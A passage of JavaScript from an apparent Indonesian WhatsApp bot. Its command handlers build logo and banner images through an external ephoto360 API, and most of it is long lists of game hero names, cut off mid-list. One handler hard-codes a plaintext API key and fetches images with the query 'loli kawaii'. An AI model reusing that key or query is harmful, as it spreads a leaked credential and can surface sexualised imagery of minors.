if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|icon*\n*Untuk List Icon Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&icon=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listpencilsketch': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST ICON*
│
├❖ *LIST*
│1 ▸ *bird*
│2 ▸ *butterfly*
│3 ▸ *coffee*
│4 ▸ *dove*
│5 ▸ *leaf*
│6 ▸ *like*
│7 ▸ *lotus*
│8 ▸ *milk-tea*
│9 ▸ *panda*
│10 ▸ *tree*
│11 ▸ *woman*
│12 ▸ *bear*
│13 ▸ *bull*
│14 ▸ *dragon*
│15 ▸ *eagle*
│16 ▸ *hawk*
│17 ▸ *ninja*
│18 ▸ *paw*
│19 ▸ *rooster*
│20 ▸ *sabertooth*
│21 ▸ *skull*
│22 ▸ *warrior*
│23 ▸ *zebra*
│
╰────────────˧`)
}
break

case'bannerofaov':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|character*\n*Untuk List Character Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|character*\n*Untuk List Character Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&character=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listbannerofaov': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`"peura",
"rouie-5",
"roxie-2",
"sinestrea-4",
"tachi",
"telannas-7",
"tulen-7",
"veera-3",
"veera-4",
"veres-6",
"violet-7",
"wukong-3",
"annette-6",
"astrid-5",
"bright-2",
"butterfly-4",
"butterfly-5",
"diao-chan",
"enzo-4",
"helen",
"iggy-3",
"ilumia-4",
"ishar-5",
"lauriel-7",
"mina-4",
"annette-5",
"aoi-3",
"arum-3",
"azzenka",
"bright",
"capheny-6",
"celica-2",
"elsu-3",
"ilumia-3",
"ishar-4",
"kahlii-2",
"lauriel-6",
"laville-4",
"liliana-6",
"mina-3",
"paine",
"rouie-4",
"veres5",
"murad-6",
"veres-2",
"tulen-5",
"lindis-2",
"dextra",
"nakroth-6",
"sephera3",
"darcy2",
"capheny4",
"astrid4",
"yorn2",
"airi4",
"sinestrea2",
"sinestrea1",
"zephys2",
"yena4",
"volkath3",
"tulen4",
"thorne",
"quillen5",
"nakroth5",
"laville3",
"hayate4",
"florentino3",
"butterfly3",
"amily3",
"annette4",
"allain",
"arum2",
"astrid3",
"ata2",
"ata",
"butterfly2",
"capheny3",
"dirak",
"elandorr2",
"elandorr",
"florentino2",
"hayate3",
"ilumia2",
"ishar3",
"jinna2",
"keera",
"lauriel4",
"laville2",
"laville",
"liliana4",
"lubu2",
"mganga2",
"murad5",
"nakroth4",
"omen2",
"paine",
"preyta",
"qi2",
"quillen4",
"rouie2",
"rouie",
"skud2",
"taara",
"telannas4",
"valhein3",
"valhein2",
"violet5",
"violet4",
"yena3",
"yena2",
"zata",
"zata2",
"enzo",
"hayate2",
"krixi2",
"krizziz",
"murad4",
"volkath2",
"volkath",
"wukong2",
"arduin2",
"mina2",
"zuka2",
"wisp2",
"errol2",
"ishar2",
"lubu&diaochan",
"maloch",
"ormarr",
"thane",
"tulen&butterfly",
"ishar",
"tulen3",
"butterfly",
"lauriel3",
"liliana3",
"nakroth3",
"baldum",
"lauriel2",
"celica",
"annette3",
"capheny2",
"gildur2",
"quillen2",
"sephera2",
"ryoma2",
"tulen2",
"tulen1",
"qi",
"liliana2",
"murad3",
"zephys",
"zip2",
"airi3",
"amily2",
"astrid2",
"lauriel",
"nakroth2",
"violet3",
"airi2",
"alice3",
"arduin",
"elsu2",
"ignis",
"jinna",
"joker",
"kilgroth",
"lubu",
"marja",
"moren",
"payna",
"ryoma",
"skud",
"superman",
"valhein",
"xeniel",
"zill",
"yena",
"zip",
"sephera",
"aleister",
"alice2",
"annette2",
"arthur",
"arum",
"astrid",
"darcy",
"batman",
"errol",
"fennik",
"flash",
"florentino",
"gildur",
"grakk",
"hayate",
"kahlii",
"mganga",
"mina",
"murad2",
"omen",
"richter",
"rourke",
"telannas2",
"toro",
"violet2",
"wonderwomen",
"roxie",
"natalya",
"airi",
"amily",
"annette",
"elsu",
"ilumia",
"alice",
"zuka",
"wisp",
"wiro",
"veres",
"quillen",
"lindis",
"krixi",
"murad",
"liliana",
"enzo",
"diaochan",
"capheny",
"veera",
"tulen",
"slimz",
"yorn",
"violet",
"telannas",
"raz",
"wukong",
"nakroth"`) 
}
break

case'fbgamepubgcover':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|cover*\n*Untuk List Cover Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|cover*\n*Untuk List Cover Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&template=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listfbgamepubgcover': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST COVER*
│
├❖ *LIST*
│1 ▸ *cover-1*
│2 ▸ *cover-2*
│3 ▸ *cover-3*
│4 ▸ *cover-4*
│5 ▸ *cover-5*
│6 ▸ *cover-6*
│7 ▸ *cover-7*
│8 ▸ *cover-8*
│9 ▸ *cover-9*
│10 ▸ *cover-10*
│11 ▸ *cover-11*
│12 ▸ *cover-12*
│
╰────────────˧`)
}
break

case'anonymous': case'pubglogomaker': case'astronotspace': case'maketeamlogo':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|style*\n*Untuk List Style Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|style*\n*Untuk List Style Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&style=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listanonymous': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *style-1*
│2 ▸ *style-2*
│3 ▸ *style-3*
│
╰────────────˧`)
}
break
case'listpubglogomaker': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *women*
│2 ▸ *nen*
│
╰────────────˧`)
}
break
case'listastronotspace': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *anubis*
│2 ▸ *dragon*
│3 ▸ *duck*
│4 ▸ *gorilla*
│5 ▸ *panda*
│6 ▸ *panther*
│7 ▸ *shark*
│8 ▸ *squirrel*
│9 ▸ *tiger*
│10 ▸ *wolf*
│11 ▸ *bull*
│12 ▸ *rhino*
│13 ▸ *rooster*
│14 ▸ *pikachu*
│15 ▸ *parrot*
│16 ▸ *boar*
│17 ▸ *bee*
│18 ▸ *hurricane*
│19 ▸ *deer*
│20 ▸ *horse*
│21 ▸ *crocodile*
│22 ▸ *pitbull*
│
╰────────────˧`)
}
break
case'listmaketeamlogo': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *anubis*
│2 ▸ *cowgirl*
│3 ▸ *dragon*
│4 ▸ *duck*
│5 ▸ *ghost*
│6 ▸ *gorilla*
│7 ▸ *panda*
│8 ▸ *panther*
│9 ▸ *shark*
│10 ▸ *squirrel*
│11 ▸ *tiger*
│12 ▸ *wolf*
│13 ▸ *bee*
│14 ▸ *crocodile*
│15 ▸ *deer*
│16 ▸ *pitbull*
│17 ▸ *horse*
│18 ▸ *hurricane*
│19 ▸ *indian*
│20 ▸ *assassin*
│21 ▸ *boar*
│22 ▸ *rapid*
│23 ▸ *raven*
│24 ▸ *warrior*
│25 ▸ *pikachu*
│26 ▸ *pubg*
│27 ▸ *ninja*
│28 ▸ *drift*
│29 ▸ *yasuo*
│30 ▸ *rhino*
│31 ▸ *phoenix*
│32 ▸ *bull*
│33 ▸ *hornet*
│34 ▸ *eagle*
│35 ▸ *hunter*
│36 ▸ *parrot*
│37 ▸ *rooster*
│38 ▸ *lion*
│39 ▸ *skull*
│40 ▸ *wolver*
│41 ▸ *wolf*
│42 ▸ *cobra*
│43 ▸ *dragon*
│44 ▸ *panther*
│45 ▸ *owl*
│46 ▸ *tiger*
│47 ▸ *reaper*
│48 ▸ *warrior*
│
╰────────────˧`)
}
break

case'colorfulpubg':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|color*\n*Untuk List Color Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|color*\n*Untuk List Color Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&color=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listcolorfulpubg': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST COLOR*
│
├❖ *LIST*
│1 ▸ *gold*
│2 ▸ *green-blue*
│3 ▸ *green-yellow*
│4 ▸ *pink-yellow*
│5 ▸ *cyan-purple*
│6 ▸ *orange-red*
│
╰────────────˧`)
}
break

case'metalmascot': case'blueneon': case'circlemascotteam': case'cutegirlgamer':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|logo*\n*Untuk List Logo Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|logo*\n*Untuk List Logo Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&logo=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listmetalmascot': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *snakelion*
│2 ▸ *dragon*
│3 ▸ *eagle*
│4 ▸ *falcon*
│5 ▸ *fox*
│6 ▸ *lion*
│7 ▸ *panther*
│8 ▸ *phoenix*
│9 ▸ *rhino*
│10 ▸ *squirrel*
│11 ▸ *unicorn*
│12 ▸ *tiger*
│13 ▸ *zebra* 
│14 ▸ *wolf* 
│
╰────────────˧`)
}
break
case'listblueneon': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *tiger*
│2 ▸ *shark*
│3 ▸ *dugong*
│4 ▸ *bull*
│5 ▸ *cheetah*
│6 ▸ *lion*
│
╰────────────˧`)
}
break
case'listcirclemascotteam': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *panther*
│2 ▸ *rhino*
│3 ▸ *squirrel*
│4 ▸ *unicorn*
│5 ▸ *zebra*
│6 ▸ *lionsnake*
│7 ▸ *bear*
│8 ▸ *bull*
│9 ▸ *dragon*
│10 ▸ *eagle*
│11 ▸ *fox*
│12 ▸ *griffin*
│13 ▸ *hawk*
│14 ▸ *lion*
│15 ▸ *peacock*
│16 ▸ *phoenix*
│17 ▸ *tiger*
│18 ▸ *wolver*
│
╰────────────˧`)
}
break
case'listcutegirlgamer': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *style-1*
│2 ▸ *style-2*
│3 ▸ *style-3*
│4 ▸ *style-4*
│5 ▸ *style-5*
│6 ▸ *style-6*
│7 ▸ *style-7*
│8 ▸ *style-8*
│9 ▸ *style-9*
│10 ▸ *style-10*
│11 ▸ *style-11*
│12 ▸ *style-12*
│
╰────────────˧`)
}
break

case'effect3donbeach':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|background*\n*Untuk List Background Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|background*\n*Untuk List Background Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&background=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listeffect3donbeach': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *beach-1*
│2 ▸ *beach-2*
│3 ▸ *beach-3*
│4 ▸ *beach-4*
│5 ▸ *beach-5*
│6 ▸ *beach-6*
│
╰────────────˧`)
}
break

case'coverbannerlol': case'wallpaperaov': case'wallpaperml':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|hero*\n*Untuk List Hero Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|hero*\n*Untuk List Hero Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&heroes=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'wallpaper': case 'wp':{
  if (!isPremium) return newReply ('Khusus premium sayankk')
  let wp = 'https://api.lolhuman.xyz/api/wallpaper?apikey=6b882dde90583a8ea51d4fcf&query=loli%20kawaii'
  juna.sendMessage(m.chat, { image: { url: wp }, caption: `Random Wallpaper HD`}, {quoted: m})
  
  
}
break
case'listcoverbannerlol': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`      "jinx7",
        "jinx-8",
        "kassadin-5",
        "nissfortune-5",
        "pyke-7",
        "riven-8",
        "sylas-5",
        "vayne-9",
        "kassadin-4",
        "qiyana-5",
        "renataglasc",
        "shen-5",
        "heimerdinger-3",
        "nunu-5",
        "orianna-4",
        "ziggs-4",
        "soraka-9",
        "soraka-10",
        "xayah-3",
        "zeri-2",
        "ahri-9",
        "akshan-2",
        "amumu-4",
        "annie-3",
        "bard-3",
        "brand-5",
        "diana-4",
        "draven-3",
        "ekko-6",
        "elise-4",
        "ezreal-7",
        "gwen-3",
        "janna-6",
        "kindred-3",
        "leblanc-7",
        "leona-7",
        "lissandra-4",
        "lux-8",
        "lux-9",
        "nalzahar-4",
        "nasteryi-7",
        "reksai-3",
        "sett-3",
        "sivir-6",
        "teemo-5",
        "tristana-6",
        "vladimir-5",
        "xinzhao-5",
        "zed-7",
        "zeri",
        "caitlyn-6",
        "caitlyn-7",
        "caitlyn-8",
        "caitlyn-9",
        "caitlyn-10",
        "caitlyn-11",
        "jayce-5",
        "kaisa-8",
        "karma-7",
        "thresh-6",
        "vi-5",
        "yasuo-8",
        "yasuo-9",
        "fiora-8",
        "norgana-7",
        "nami-5",
        "poppy-4",
        "syndra-5",
        "yuumi-4",
        "jarvaniv-6",
        "kayn-4",
        "kayle-5",
        "lillia-2",
        "norgana-6",
        "tryndamere-3",
        "vex",
        "vex-2",
        "yone-4",
        "tristana-5",
        "viego-2",
        "akali-10",
        "anivia-4",
        "darius-5",
        "graves-6",
        "seraphine-5",
        "shaco-2",
        "twistedfate-4",
        "xayah-2",
        "zyra-5",
        "ahri-8",
        "ashe-6",
        "cassiopeia-4",
        "evelynn-6",
        "leblanc-6",
        "nalphite-4",
        "warwick-5",
        "akshan",
        "graves-5",
        "nissfortune-5",
        "pyke-6",
        "rengar-6",
        "thresh-5",
        "diana-3",
        "relia-11",
        "olaf-3",
        "pantheon-6",
        "pantheon-7",
        "riven-7",
        "vayne-8",
        "corki-4",
        "naokai-2",
        "rammus-4",
        "veigar-4",
        "zed-6",
        "camille-4",
        "drmundo-3",
        "lucian-6",
        "nordekaiser-4",
        "renekton-4",
        "sejuani-5",
        "senna-3",
        "sylas-4",
        "varus-5",
        "xerath-3",
        "damwon",
        "galio-3",
        "gwen",
        "gwen-2",
        "jax-5",
        "jinx-6",
        "kayle-5",
        "sion-2",
        "twitch-4",
        "velkoz-4",
        "blitzcrank-3",
        "leona-6",
        "lulu-3",
        "lulu-4",
        "lux-7",
        "nasus-5",
        "nunu-4",
        "rumble-2",
        "samira-3",
        "aphelios-2",
        "blitzcrank-2",
        "caitlyn-5",
        "garen-6",
        "kogmaw-4",
        "leona-5",
        "alzahar-3",
        "syndra-4",
        "wukong-4",
        "yone-3",
        "yuumi-3",
        "zyra-4",
        "alistar-4",
        "chogath-2",
        "draven-2",
        "fiora-7",
        "jarvan-5",
        "jhin-5",
        "karma-6",
        "nautilus-2",
        "neeko-5",
        "shyvana-3",
        "viego",
        "azir-4",
        "diana-4",
        "gragas-2",
        "janna-5",
        "kalista-3",
        "katarina-6",
        "ornn-2",
        "qiyana-4",
        "quinn-3",
        "rell",
        "xinzhao-4",
        "anivia-3",
        "hecarim-4",
        "illaoi-2",
        "jayce-4",
        "lissandra-3",
        "nami-4",
        "nasus-4",
        "nidalee-5",
        "seraphine-4",
        "singed-2",
        "skarner-2",
        "soraka-7",
        "varus-4",
        "vladimir-4",
        "yorick-4",
        "zac",
        "riven-8",
        "ahri-7",
        "akali-9",
        "evelynn-5",
        "kaisa-7",
        "lucian-5",
        "seraphine",
        "seraphine-2",
        "seraphine-3",
        "aatrox-6",
        "amumu-3",
        "lise-3",
        "fizz-5",
        "karma-5",
        "zeri-2",
        "kassadin-3",
        "khazix-4",
        "sivir-5",
        "twistedfate-3",
        "ashe-5",
        "brand-4",
        "leesin-5",
        "olaf-2",
        "sett-2",
        "kayle-4",
        "leblanc-5",
        "pyke-5",
        "samira",
        "samira-2",
        "viktor-2",
        "yasuo-7",
        "zed-5",
        "ezreal-6",
        "nasteryi-6",
        "shen-4",
        "sona-4",
        "vi-4",
        "yone",
        "yone-2",
        "ziggs-3",
        "ahri-6",
        "cassiopeia-3",
        "kindred-2",
        "riven-6",
        "kennen-2",
        "kogmaw-3",
        "lillia",
        "syndra-3",
        "teemo-4",
        "thresh-4",
        "vayne-7",
        "velkoz-3",
        "yasuo-6",
        "zoe-4",
        "bard-2",
        "gnar-3",
        "irelia-10",
        "nocturne-4",
        "poppy-3",
        "enna-2",
        "volibear-3",
        "volibear-4",
        "ekko-5",
        "fiora-6",
        "lucian-4",
        "pantheon-5",
        "leblanc-4",
        "norgana-5",
        "urgot-4",
        "zyra-3",
        "jinx-5",
        "sett",
        "alistar-3",
        "katarina-5",
        "lux-5",
        "lux-6",
        "nasteryi-5",
        "nalphite-3",
        "nordekaiser-3",
        "reksai-2",
        "sejuani-4",
        "tryndamere-2",
        "xerath-2",
        "aphelios",
        "garen-5",
        "jax-4",
        "karma-4",
        "leesin-4",
        "leona-4",
        "nidalee-4",
        "rengar-5",
        "soraka-5",
        "soraka-6",
        "swain-4",
        "sylas-3",
        "trundle-2",
        "vladimir-3",
        "aatrox-5",
        "akali-8",
        "ekko-4",
        "qiyana-3",
        "senna",
        "yasuo-5",
        "ashe-4",
        "darius-4",
        "hecarim-3",
        "norgana-4",
        "nami-3",
        "riven-4",
        "riven-5",
        "ryze-3",
        "neeko-3",
        "eeko-4",
        "xayahrakan",
        "zoe-3",
        "airi-6",
        "noctune-3",
        "pantheon-3",
        "pantheon-4",
        "rammus-3",
        "udyr-2",
        "veigar-3",
        "akali-7",
        "garen-4",
        "irelia-8",
        "irelia-9",
        "jinx-4",
        "lucian-3",
        "pyke-4",
        "warwick-4",
        "caitlyn-3",
        "caitlyn-4",
        "kaisa-6",
        "qiyana",
        "qiyana-2",
        "yasuo-4",
        "jhin-3",
        "karma-3",
        "nordekaiser-2",
        "tristana-4",
        "nami",
        "poppy-3",
        "aatrox",
        "lulu",
        "braum",
        "camille",
        "karma",
        "kindred",
        "hecarim",
        "norgana",
        "renekton",
        "kennen",
        "akali",
        "varus",
        "orianna",
        "blitzcrank",
        "bloodmoonjhin",
        "bloodmoontalon",
        "arcaderiven",
        "udyr",
        "rumble",
        "gnar",
        "shaco",
        "twitch",
        "veigar",
        "tryndamere",
        "viktor",
        "trundle",
        "ezreal",
        "poppy",
        "lissandra",
        "jax",
        "vi",
        "vellkoz",
        "darius",
        "diana",
        "corki",
        "sivir",
        "ryze",
        "azir",
        "tristana",
        "kled",
        "volibear",
        "twisterfate",
        "anivia",
        "zyra",
        "quinn",
        "nissfortune",
        "kalista",
        "ezrealandshen",
        "gangplank",
        "hextachannie",
        "elementalistlux",
        "xinzhao",
        "vayne",
        "jhin",
        "reksai",
        "graves",
        "kogmaw",
        "garen",
        "porojinx",
        "warwick",
        "fizz",
        "caitlyn",
        "rengar",
        "talon",
        "nidalee",
        "lux",
        "jinx",
        "thresh",
        "wukong",
        "sona",
        "ahri",
        "riven",
        "zed",
        "leesin",
        "janna",
        "katarina",
        "leblanc",
        "leona",
        "fiora",
        "lucian",
        "shen",
        "ziggs",
        "yasuo",
        "ekko",
        "draven",
        "ashe",
        "ekko-5",
        "teemo",
        "khazix",
        "nasteryi",
        "brand",
        "taliyah",
        "nocturne",
        "cassiopeia",
        "xayah",
        "rakan",
        "syndra",
        "irelia",
        "leesingf",
        "yasuobm",
        "aurelionsol",
        "pantheon",
        "bard",
        "singed",
        "soraka",
        "taric",
        "naokai",
        "xerath",
        "gragas",
        "jayce",
        "riven3",
        "nalphite",
        "naster_yi2",
        "chogath",
        "zed2",
        "darius2",
        "talon2",
        "kayle",
        "drmundo",
        "rammus",
        "vladimir",
        "ahri-2",
        "karma-2",
        "jarvan",
        "nidalee-2",
        "vayner-2",
        "warwick-2",
        "rengar-2",
        "yasuo-3",
        "galio",
        "pantheon-2",
        "jinx-2",
        "nalzahar",
        "olaf",
        "shyvana",
        "thresh-2",
        "sion",
        "caitlyn-2",
        "swain",
        "kassadin",
        "heimerdinger",
        "amumu",
        "alistar",
        "nasus",
        "sejuani",
        "ezreal3",
        "nautilus",
        "fiddlesticks",
        "sona2",
        "karthus",
        "ekko2",
        "orianna2",
        "velkoz-2",
        "xinzhao2",
        "garen2",
        "annie-2",
        "yasuonb",
        "rivendb",
        "kayn",
        "kaisa",
        "veigar-2",
        "vayne-3",
        "twitch-2",
        "tristana-2",
        "rhaast",
        "nalzahar-2",
        "kayle-2",
        "illaoi",
        "fizz-2",
        "elise",
        "brand-2",
        "syndra-2",
        "soraka-2",
        "nissfortune-2",
        "hecarim-2",
        "ezreal-2",
        "ahri-3",
        "yorick",
        "z-2",
        "tahmkench",
        "shen-2",
        "ornn",
        "cassiopeia-2",
        "renekton-2",
        "nasus-2",
        "jarvan-2",
        "fiora-2",
        "alistar-2",
        "taric-2",
        "zac-2",
        "yorick-2",
        "varus-2",
        "nordekaiser",
        "nasteryi-3",
        "katarina-2",
        "janna-2",
        "fiora-3",
        "evelynn",
        "elise-2",
        "ashe-2",
        "annie",
        "zoe",
        "vi-2",
        "vayne-4",
        "rengar-3",
        "jhin-2",
        "graves-2",
        "xayahrakan",
        "warwick-3",
        "nissfortune-3",
        "lux-2",
        "jarvaniv",
        "zoe-2",
        "swain-2",
        "sivir-2",
        "nissfortune-4",
        "jax-2",
        "galio-2",
        "varus-3",
        "urgot",
        "twistedfate-2",
        "taric-3",
        "swain-3",
        "shen-3",
        "rammus-2",
        "pyke-2",
        "pyke",
        "nasus-3",
        "talon",
        "khazix-2",
        "kayn-2",
        "irelia-2",
        "evelynn-2",
        "akali-2",
        "vladimir-2",
        "jayce-2",
        "janna-3",
        "irelia-4",
        "irelia-3",
        "diana-2",
        "zed-3",
        "teemo-2",
        "taliyah-2",
        "shyvana-2",
        "poppy-2",
        "katarina-3",
        "jax-3",
        "garen-3",
        "darius-3",
        "chogath-2",
        "aatrox-2",
        "soraka-3",
        "sona-3",
        "sivir-3",
        "kaisa-2",
        "akali-4",
        "akali-3",
        "xinzhao-3",
        "urgot-3",
        "urgot-2",
        "tristana-3",
        "talon-3",
        "sejuani-2",
        "nunu-2",
        "lulu-2",
        "lucian-2",
        "irelia-6",
        "irelia-5",
        "ashe-3",
        "ziggs-2",
        "yasuo-2",
        "sona-4",
        "nalphite-2",
        "khazix-3",
        "kayn-3",
        "jinx-3",
        "orianna-3",
        "kaisa-4",
        "kaisa-3",
        "heimerdinger-2",
        "ezreal-4",
        "evelynn-3",
        "akali-5",
        "ahri-4",
        "thresh-3",
        "ryze-2",
        "kled-2",
        "janna-4",
        "graves-3",
        "fiddlesticks-2",
        "ekko-3",
        "amumu-2",
        "nami-2",
        "lulusoraka",
        "lissandra-2",
        "leona-3",
        "leona-2",
        "leblanc-2",
        "ezrealmissfortune",
        "camille-2",
        "twitch-3",
        "soraka-4",
        "renekton-3",
        "neeko-2",
        "neeko",
        "nasteryi-4",
        "drmundo-2",
        "akali-6",
        "zyra-2",
        "zilean",
        "wukong-3",
        "wukong-2",
        "teemo-3",
        "skarner",
        "sivir-4",
        "riven-2",
        "quinn-2",
        "pyke-3",
        "nocturne-2",
        "nidalee-3",
        "norgana-2",
        "leesin-3",
        "kogmaw-2",
        "kassadin-2",
        "karthus-2",
        "kalista-2",
        "gnar-2",
        "gangplank-2",
        "corki-2",
        "azir-3",
        "azir-2",
        "aatrox-4",
        "aatrox-3",
        "vi-3",
        "vayne-6",
        "vayne-5",
        "tahmkench-2",
        "sylas-2",
        "sylas",
        "sejuani-3",
        "fiora-4",
        "nunu-3",
        "norgana-3",
        "kayle-3",
        "brand-3",
        "anivia-2",
